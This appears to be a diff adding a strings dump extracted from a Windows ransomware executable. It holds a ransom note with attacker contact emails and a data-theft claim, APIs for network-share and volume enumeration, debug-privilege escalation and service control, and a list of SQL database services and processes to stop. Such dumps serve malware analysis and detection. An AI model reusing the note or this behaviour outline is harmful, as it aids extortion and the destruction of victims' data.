@@ -1,0 +1,1064 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+@.reloc
+Hj.Yf9
+j\Zf9TH
+QQSVWj03
+8FIDEu
+L.CAtej
+8FIDEu
+t-VWQ3
+SSSSSSSj
+!C@!C0
+t[QWQP
+PPj7SPQ
+u&PPj7SPQ
+uzPPj7
+QQSVWd
+t/hDsA
+URPQQh
+;t$,v-
+UQPXY]Y[
+YYh0rA
+j"_f9y
+PPPPPWS
+PP9E u:PPVWP
+j,hXZB
+tlj*Yf
+f9:t!V
+QQSVj8j@
+PPPPPPPP
+bad allocation
+SleepConditionVariableCS
+WakeAllConditionVariable
+bad exception
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__swift_1
+__swift_2
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+operator co_await
+operator<=>
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+`anonymous namespace'
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+CorExitProcess
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+LCMapStringEx
+LocaleNameToLCID
+AppPolicyGetProcessTerminationMethod
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+Unknown exception
+bad array new length
+string too long
+SeDebugPrivilege
+invalid string position
+list too long
+Good day. All your files are encrypted. For decryption contact us.
+Write here helpadmin2@protonmail.com
+reserve helpadmin2@cock.li
+We also inform that your databases, ftp server and file server were downloaded by us to our servers.
+* Do not rename encrypted files.
+* Do not try to decrypt your data using third party software,
+  it may cause permanent data loss.
+* Do not stop process of encryption, because partial encryption cannot be decrypted.
+expand 32-byte kexpand 16-byte kSHA256wECDSA
+SHA512wECDSA
+md5WithRSAEncryption
+Unknown
+-----BEGIN
+PRIVATE KEY-----
+SHA384wECDSA
+sha512WithRSAEncryption
+sha1WithRSAEncryption
+SHAwDSA
+sha256WithRSAEncryption
+sha384WithRSAEncryption
+SHAwECDSA
+hcertificate_unknown
+SECP112R1
+DB7C2ABF62E35E668076BEAD208B
+DB7C2ABF62E35E668076BEAD2088
+659EF8BA043916EEDE8911702B22
+DB7C2ABF62E35E7628DFAC6561C5
+9487239995A5EE76B55F9C2F098
+A89CE5AF8724C0A23E0E0FF77500
+SECP128R1
+FFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF
+FFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFC
+E87579C11079F43DD824993C2CEE5ED3
+FFFFFFFE0000000075A30D1B9038A115
+161FF7528B899B2D0C28607CA52C5B86
+CF5AC8395BAFEB13C02DA292DDED7A83
+SECP160R1
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF7FFFFFFF
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF7FFFFFFC
+1C97BEFC54BD7A8B65ACF89F81D4D4ADC565FA45
+100000000000000000001F4C8F927AED3CA752257
+4A96B5688EF573284664698968C38BB913CBFC82
+23A628553168947D59DCC912042351377AC5FB32
+SECP192R1
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFF
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFC
+64210519E59C80E70FA7E9AB72243049FEB8DEECC146B9B1
+FFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22831
+188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012
+7192B95FFC8DA78631011ED6B24CDD573F977A11E794811
+SECP224R1
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF000000000000000000000001
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFE
+B4050A850C04B3ABF54132565044B0B7D7BFD8BA270B39432355FFB4
+FFFFFFFFFFFFFFFFFFFFFFFFFFFF16A2E0B8F03E13DD29455C5C2A3D
+B70E0CBD6BB4BF7F321390B94A03C1D356C21122343280D6115C1D21
+BD376388B5F723FB4C22DFE6CD4375A05A07476444D5819985007E34
+PRIME239V1
+7FFFFFFFFFFFFFFFFFFFFFFF7FFFFFFFFFFF8000000000007FFFFFFFFFFF
+7FFFFFFFFFFFFFFFFFFFFFFF7FFFFFFFFFFF8000000000007FFFFFFFFFFC
+6B016C3BDCF18941D0D654921475CA71A9DB2FB27D1D37796185C2942C0A
+7FFFFFFFFFFFFFFFFFFFFFFF7FFFFF9E5E9A9F5D9071FBD1522688909D0B
+0FFA963CDCA8816CCC33B8642BEDF905C3D358573D3F27FBBD3B3CB9AAAF
+7DEBE8E4E90A5DAE6E4054CA530BA04654B36818CE226B39FCCB7B02F1AE
+SECP256R1
+FFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
+FFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC
+5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B
+FFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
+6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296
+4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5
+SECP384R1
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC
+B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF
+FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973
+AA87CA22BE8B05378EB1C71EF320AD746E1D3B628BA79B9859F741E082542A385502F25DBF55296C3A545E3872760AB7
+3617DE4A96262C6F5D9E98BF9292DC29F8F41DBD289A147CE9DA3113B5F0B8C00A60B1CE1D7E819D7A431D7C90EA0E5F
+SECP521R1
+1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
+1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC
+51953EB9618E1C9A1F929A21A0B68540EEA2DA725B99B315F3B8B489918EF109E156193951EC7E937B1652C0BD3BB1BF073573DF883D2C34F1EF451FD46B503F00
+1FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409
+C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE3348B3C1856A429BF97E7E31C2E5BD66
+11839296A789A3BC0045C8A5FB42C7D1BD998F54449579B446817AFBD17273E662C97EE72995EF42640C550B9013FAD0761353C7086A272C24088BE94769FD16650
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/unrecognized_name
+protocol_version
+bad_record_mac
+bad_certificate
+unsupported_certificate
+close_notify
+unexpected_message
+decrypt_error
+decompression_failure
+certificate_revoked
+no_renegotiation
+handshake_failure
+record_overflow
+unknown_ca
+no_certificate
+no_application_protocol
+illegal_parameter
+bad_certificate_status_response
+certificate_expired
+decode_error
+D7q/;M
+='9-6d
+_jbF~T
+11#?*0
+,4$8_@
+t\lHBW
+QPeA~S
+>4$8,@
+p\lHtW
++HpXhE
+T[$:.6
+=j&&LZ66lA??~
+}{))R>
+f""D~**T
+V22dN::t
+o%%Jr..\$
+&&Lj66lZ??~A
+99rKJJ
+==zGdd
+""Df**T~
+;22dV::tN
+$$Hl\\
+C77nYmm
+%%Jo..\r
+>!KK
+55j_WW
+&Lj&6lZ6?~A?
+~=zG=d
+"Df"*T~*
+2dV2:tN:
+x%Jo%.\r.
+t>!K
+a5j_5W
+ggV}++
+Lj&&lZ66~A??
+bS11*?
+Xt,,4.
+RRvM;;
+MMfU33
+PPxD<<%
+Bc!! 0
+~~zG==
+Df""T~**;
+dV22tN::
+xxJo%%\r..8$
+tt>!
+pp|B>>q
+aaj_55
+UUPx((
+)4%/7
+(3-!0,1'8"5.*2$
+<4,$?7/'
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\CLNTDOWNGRD
+666666666666666666666666666666666666666666666666CLNTx>B
+key expansion
+client finished
+server finished
+extended master secret
+master secret
+prime256v1
+secp384r1
+Proc-Type
+DEK-Info
+DES-CBC
+DES-EDE3-CBC
+AES-128-CBC
+AES-192-CBC
+AES-256-CBC
+SHA256
+SHA384
+SHA512
+SHA3_224
+SHA3_256
+SHA3_384
+SHA3_512
+AES-128-CFB1
+AES-192-CFB1
+AES-256-CFB1
+AES-128-CFB8
+AES-192-CFB8
+AES-256-CFB8
+AES-128-CFB128
+AES-192-CFB128
+AES-256-CFB128
+AES-128-OFB
+AES-192-OFB
+AES-256-OFB
+AES-128-XTS
+AES-256-XTS
+AES-128-GCM
+AES-192-GCM
+AES-256-GCM
+AES-128-CTR
+AES-192-CTR
+AES-256-CTR
+AES-128-ECB
+AES-192-ECB
+AES-256-ECB
+DES-ECB
+DES-EDE3-ECB
+des-ecb
+DES-EDE3
+des-ede3
+des-ede3-ecb
+AES128-CBC
+aes128-cbc
+AES192-CBC
+aes192-cbc
+AES256-CBC
+aes256-cbc
+AES128-ECB
+aes128-ecb
+AES192-ECB
+aes192-ecb
+AES256-ECB
+aes-128-gcm
+id-aes128-GCM
+aes-192-gcm
+id-aes192-GCM
+aes-256-gcm
+id-aes256-GCM
+ssl3-md4
+ssl3-md5
+ssl3-sha1
+P-112-2
+P-128-2
+P-160-2
+basicConstraints
+X509v3 Basic Constraints
+subjectAltName
+X509v3 Subject Alternative Name
+crlDistributionPoints
+X509v3 CRL Distribution Points
+authorityInfoAccess
+Authority Information Access
+authorityKeyIdentifier
+X509v3 Authority Key Identifier
+subjectKeyIdentifier
+X509v3 Subject Key Identifier
+keyUsage
+X509v3 Key Usage
+inhibitAnyPolicy
+X509v3 Inhibit Any Policy
+extendedKeyUsage
+X509v3 Extended Key Usage
+nameConstraints
+X509v3 Name Constraints
+certificatePolicies
+X509v3 Certificate Policies
+caIssuers
+CA Issuers
+anyPolicy
+X509v3 Any Policy
+Hardware name
+anyExtendedKeyUsage
+Any Extended Key Usage
+serverAuth
+TLS Web Server Authentication
+clientAuth
+TLS Web Client Authentication
+OCSPSigning
+OCSP Signing
+commonName
+surname
+serialNumber
+countryName
+localityName
+stateOrProvinceName
+organizationName
+organizationalUnitName
+emailAddress
+domainComponent
+businessCategory
+jurisdictionC
+jurisdictionCountryName
+jurisdictionST
+jurisdictionStateOrProvinceName
+sha256
+sha384
+sha512
+DSA-SHA1
+dsaWithSHA1
+RSA-MD5
+md5WithRSAEncryption
+RSA-SHA1
+sha1WithRSAEncryption
+RSA-SHA256
+sha256WithRSAEncryption
+RSA-SHA384
+sha384WithRSAEncryption
+RSA-SHA512
+sha512WithRSAEncryption
+ecdsa-with-SHA1
+shaWithECDSA
+ecdsa-with-SHA256
+sha256WithECDSA
+ecdsa-with-SHA384
+sha384WithECDSA
+ecdsa-with-SHA512
+sha512WithECDSA
+dsaEncryption
+rsaEncryption
+ecdsaEncryption
+id-ecPublicKey
+dhKeyAgreement
+prime192v1
+prime192v2
+prime192v3
+prime239v1
+prime239v2
+prime239v3
+secp112r1
+secp112r2
+secp128r1
+secp128r2
+secp160r1
+secp160r2
+secp224r1
+secp521r1
+secp160k1
+secp192k1
+secp224k1
+secp256k1
+brainpoolP160r1
+brainpoolP192r1
+brainpoolP224r1
+brainpoolP256r1
+brainpoolP320r1
+brainpoolP384r1
+brainpoolP512r1
+aes-128-cbc
+aes-192-cbc
+aes-256-cbc
+des-cbc
+des-ede3-cbc
+PBKDFv2
+PBKDF2
+PBE-SHA1-RC4-128
+pbeWithSHA1And128BitRC4
+PBE-SHA1-DES
+pbeWithSHA1AndDES-CBC
+PBE-SHA1-3DES
+pbeWithSHA1And3-KeyTripleDES-CBC
+AES-128 wrap
+aes128-wrap
+AES-192 wrap
+aes192-wrap
+AES-256 wrap
+aes256-wrap
+dhSinglePass-stdDH-sha1kdf-scheme
+dhSinglePass-stdDH-sha256kdf-scheme
+dhSinglePass-stdDH-sha384kdf-scheme
+dhSinglePass-stdDH-sha512kdf-scheme
+RC4-SHA
+SSL_RSA_WITH_RC4_128_SHA
+RC4-MD5
+SSL_RSA_WITH_RC4_128_MD5
+DES-CBC3-SHA
+SSL_RSA_WITH_3DES_EDE_CBC_SHA
+AES128-SHA
+TLS_RSA_WITH_AES_128_CBC_SHA
+AES256-SHA
+TLS_RSA_WITH_AES_256_CBC_SHA
+DHE-RSA-AES128-SHA
+TLS_DHE_RSA_WITH_AES_128_CBC_SHA
+DHE-RSA-AES256-SHA
+TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+HC128-MD5
+TLS_RSA_WITH_HC_128_MD5
+HC128-SHA
+TLS_RSA_WITH_HC_128_SHA
+RABBIT-SHA
+TLS_RSA_WITH_RABBIT_SHA
+ECDHE-RSA-AES128-SHA
+TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+ECDHE-RSA-AES256-SHA
+TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+ECDHE-ECDSA-AES128-SHA
+TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
+ECDHE-ECDSA-AES256-SHA
+TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
+ECDHE-RSA-RC4-SHA
+TLS_ECDHE_RSA_WITH_RC4_128_SHA
+ECDHE-RSA-DES-CBC3-SHA
+TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
+ECDHE-ECDSA-RC4-SHA
+TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
+ECDHE-ECDSA-DES-CBC3-SHA
+TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
+AES128-SHA256
+TLS_RSA_WITH_AES_128_CBC_SHA256
+AES256-SHA256
+TLS_RSA_WITH_AES_256_CBC_SHA256
+DHE-RSA-AES128-SHA256
+TLS_DHE_RSA_WITH_AES_128_CBC_SHA256
+DHE-RSA-AES256-SHA256
+TLS_DHE_RSA_WITH_AES_256_CBC_SHA256
+ECDH-RSA-AES128-SHA
+TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
+ECDH-RSA-AES256-SHA
+TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
+ECDH-ECDSA-AES128-SHA
+TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
+ECDH-ECDSA-AES256-SHA
+TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
+ECDH-RSA-RC4-SHA
+TLS_ECDH_RSA_WITH_RC4_128_SHA
+ECDH-RSA-DES-CBC3-SHA
+TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
+ECDH-ECDSA-RC4-SHA
+TLS_ECDH_ECDSA_WITH_RC4_128_SHA
+ECDH-ECDSA-DES-CBC3-SHA
+TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
+AES128-GCM-SHA256
+TLS_RSA_WITH_AES_128_GCM_SHA256
+AES256-GCM-SHA384
+TLS_RSA_WITH_AES_256_GCM_SHA384
+DHE-RSA-AES128-GCM-SHA256
+TLS_DHE_RSA_WITH_AES_128_GCM_SHA256
+DHE-RSA-AES256-GCM-SHA384
+TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
+ECDHE-RSA-AES128-GCM-SHA256
+TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+ECDHE-RSA-AES256-GCM-SHA384
+TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+ECDHE-ECDSA-AES128-GCM-SHA256
+TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
+ECDHE-ECDSA-AES256-GCM-SHA384
+TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
+ECDH-RSA-AES128-GCM-SHA256
+TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256
+ECDH-RSA-AES256-GCM-SHA384
+TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384
+ECDH-ECDSA-AES128-GCM-SHA256
+TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256
+ECDH-ECDSA-AES256-GCM-SHA384
+TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384
+ECDHE-RSA-AES128-SHA256
+TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256
+ECDHE-ECDSA-AES128-SHA256
+TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256
+ECDH-RSA-AES128-SHA256
+TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256
+ECDH-ECDSA-AES128-SHA256
+TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256
+ECDHE-RSA-AES256-SHA384
+TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384
+ECDHE-ECDSA-AES256-SHA384
+TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384
+ECDH-RSA-AES256-SHA384
+TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384
+ECDH-ECDSA-AES256-SHA384
+TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384
+EDH-RSA-DES-CBC3-SHA
+TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+.text$di
+.text$mn
+.text$x
+.text$yd
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCU
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XLA
+.CRT$XLZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$T
+.rdata$r
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.tls$ZZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+.rsrc$01
+.rsrc$02
+NetShareEnum
+NetApiBufferFree
+NETAPI32.dll
+GetIpNetTable
+IPHLPAPI.DLL
+WNetCloseEnum
+WNetEnumResourceW
+WNetOpenEnumW
+MPR.dll
+FindFirstFileW
+FindNextFileW
+GetCurrentProcess
+lstrlenW
+WriteFile
+FindClose
+CreateFileW
+SetFileAttributesW
+GlobalAlloc
+GlobalFree
+CloseHandle
+CreateThread
+ReadFile
+GetFileSizeEx
+FindFirstVolumeW
+EnterCriticalSection
+TerminateProcess
+GetModuleFileNameW
+LeaveCriticalSection
+InitializeCriticalSection
+WaitForSingleObject
+K32GetProcessImageFileNameW
+OpenProcess
+GetLogicalDriveStringsW
+GetLastError
+SetEvent
+GetDiskFreeSpaceExW
+K32EnumProcesses
+SetFilePointerEx
+MoveFileExW
+ExitProcess
+GetVolumePathNamesForVolumeNameW
+CreateEventA
+FindNextVolumeW
+lstrcmpiW
+GetTickCount
+GetDriveTypeW
+DeleteCriticalSection
+QueryPerformanceCounter
+KERNEL32.dll
+wsprintfW
+GetKeyboardLayoutList
+USER32.dll
+QueryServiceStatusEx
+OpenServiceW
+ChangeServiceConfigW
+ControlService
+LookupPrivilegeValueA
+OpenSCManagerW
+CloseServiceHandle
+AdjustTokenPrivileges
+CryptReleaseContext
+CryptGenRandom
+CryptAcquireContextW
+ADVAPI32.dll
+InitializeCriticalSectionAndSpinCount
+ResetEvent
+WaitForSingleObjectEx
+CreateEventW
+GetModuleHandleW
+GetProcAddress
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsProcessorFeaturePresent
+IsDebuggerPresent
+GetStartupInfoW
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+RtlUnwind
+RaiseException
+SetLastError
+EncodePointer
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+FreeLibrary
+LoadLibraryExW
+GetModuleHandleExW
+GetStdHandle
+HeapFree
+HeapAlloc
+GetFileType
+LCMapStringW
+HeapReAlloc
+GetConsoleMode
+GetConsoleOutputCP
+FindFirstFileExW
+IsValidCodePage
+GetACP
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+MultiByteToWideChar
+WideCharToMultiByte
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+GetProcessHeap
+SetStdHandle
+GetStringTypeW
+FlushFileBuffers
+HeapSize
+WriteConsoleW
+DecodePointer
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+JERS:Y
+&l*8c`
+xDQwED
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+.?AVbad_exception@std@@
+.?AVbad_alloc@std@@
+.?AVexception@std@@
+.?AVbad_array_new_length@std@@
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+0!0)02080C0Z0d0{0
+1-1H1T1r1
+3333_3g3z3
+4<4R4Y4`4
+4:5U5_5h5
+959<9p9
+;!<*<D<
+= =@=[=b=
+?%?0?:?D?N?X?b?n?{?
+0)050A0M0Y0e0q0}0
+364K4U4|4
+7&7>7O7
+475w5*6
+8'919S9x9
+9>:H:l:z:
+=:=L=\=
+:K;R;q;
+<J>g>n>
+3O4^4z4
+6j7z9z:
+;$;?;^;{;
+=#=8=?=E=W=a=
+?$?*?/?:?D?K?Q?[?j?r?~?
+0&0+010:0A0L0R0Y0
+0(1S1h1m1r1
+3 3'3.353<3D3L3T3`3i3n3t3~3
+5$5-5\5e5n5|5
+6 7`7f7
+7D8S8\8i8
+8%9.949<9A9T9h9m9
+6!6I6]6y6
+1]2`4e4
+6*686?6E6u6
+8,8U8h8
+9!9&9+9F9P9\9a9f9
+<;=@=D=H=L=
+0$171U1c1
+3H3O3T3X3\3`3
+7B809:9G9x9
+13181D1I1]1,232E2Y2a2k2t2
+3[3e3j3p3
+3$4/4;6h6o6
+8#8(82878B8M8a8
+;#<8<C<K<V<\<g<m<{<
+=)=7=?=W=p=w=
+\0g0s1
+5z6U7\7
+8(8A8_8
+929G9Y9f9
+:A:G:Y:
+;;<U<d<r<~<
+==-=;=F=\=p=
+>G?W?m?r?w?
+0"0H0t0}0
+11161;1V1`1p1u1z1
+2%20252:2[2k2
+3:3L3X3
+1)1\1y1
+4.5f5~5
+6(6y6~6
+:P:_:m:
+<$<6<H<Z<l<~<
+=/=A=S=
+2U3z5U9v9}9
+:!;T;i;z;
+575D5t5
+7-7E7K7W7v7|7
+8 9J9R9o9
+: ;W;t;
+1.1M1x1
+1"2D2h2
+7,;4<E<
+>&?+?=?[?o?u?
+4!525C5m5
+>8>B>L>
+2 2$2@2D2H2L2P2T2h2l2p2t2x2|2
+2034383<3@3D3H3L3P3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+6 6(60686@6H6P6X6`6h6p6x6
+? ?$?(?,?0?4?8?D?L?T?X?\?`?d?
+1 1$1(1,1014181<1@1D1H1L1P1T1X1\1`1d1h1l1p1t1x1
+2 2$2(2,202
+1$1,141<1D1L1T1\1d1l1t1|1
+2$2,242<2D2L2T2\2d2l2t2|2
+3$3,343<3D3L3T3\3d3l3t3|3
+4$4,444<4D4L4T4\4d4l4t4|4
+5$5,545<5D5L5T5\5d5l5t5|5
+6$6,646<6D6L6T6\6d6l6t6|6
+7$7,747<7D7L7T7\7d7l7t7|7
+2 2(20282@2H2P2X2`2h2p2x2
+3 3(30383@3H3P3X3`3h3p3x3
+4 4(40484@4H4P4X4`4h4p4x4
+5 5(50585@5H5P5X5`5h5p5x5
+6 6(60686@6H6P6X6`6h6p6x6
+7 7(70787@7H7P7X7`7h7p7x7
+8 8(80888@8H8P8X8`8h8p8x8
+<$<,<4<<<D<L<T<\<d<l<t<|<
+P3T3X3\3`3d3h3l3
+4T4X4h4l4|4
+5 50545D5H5X5\5l5p5
+6 6$64686H6L6\6`6p6t6
+7$7(787<7L7P7`7d7t7x7
+8(8,8<8@8P8T8d8h8x8|8
+9,909@9D9T9X9h9l9|9
+: :0:4:D:H:X:\:l:p:
+; ;$;4;8;H;L;\;`;p;t;
+;H<L<P<T<X<\<`<d<h<l<p<t<x<|<
+=,=8=D=P=\=h=t=
+>(>4>@>L>X>d>p>|>
+?$?0?<?H?T?`?l?x?
+l0t0|0
+X>\>d>h>p>t>|>
+?$?(?0?4?<?@?H?L?T?X?`?d?l?p?x?|?
+0 0$0,00080<0D0H0P0T0\0`0h0l0t0x0
+;@;D;H;L;d;h;x;|;
+< <(<@<P<T<d<h<p<
+= =$=<=@=T=d=h=x=
+282D2d2p2
+3<3D3L3T3\3h3
+4$404P4X4`4l4
+5$5,545<5D5L5T5`5
+6H6P6X6\6d6x6
+7,707L7P7p7x7|7
+84888@8H8P8T8\8p8
+909P9l9p9
+:0:P:p:
+;0;P;p;
+< <(<0<D<
+8 8$8(8,8084888<8
+; ;@;\;x;
+api-ms-win-core-synch-l1-2-0.dll
+kernel32.dll
+Aapi-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+api-ms-
+mscoree.dll
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+Aapi-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l1-2-2
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+advapi32
+api-ms-win-appmodel-runtime-l1-1-2
+user32
+ext-ms-
+         (((((                  H
+Aja-JP
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+CONOUT$
+glocal
+network
+\\%d.%d.%d.%d
+%s\%s\*
+%s\%s\
+MySQL80
+SQLSERVERAGENT
+MSSQLSERVER
+SQLWriter
+SQLTELEMETRY
+SQLBrowser
+sqlagent.exe
+sqlservr.exe
+sqlwriter.exe
+sqlceip.exe
+msdtc.exe
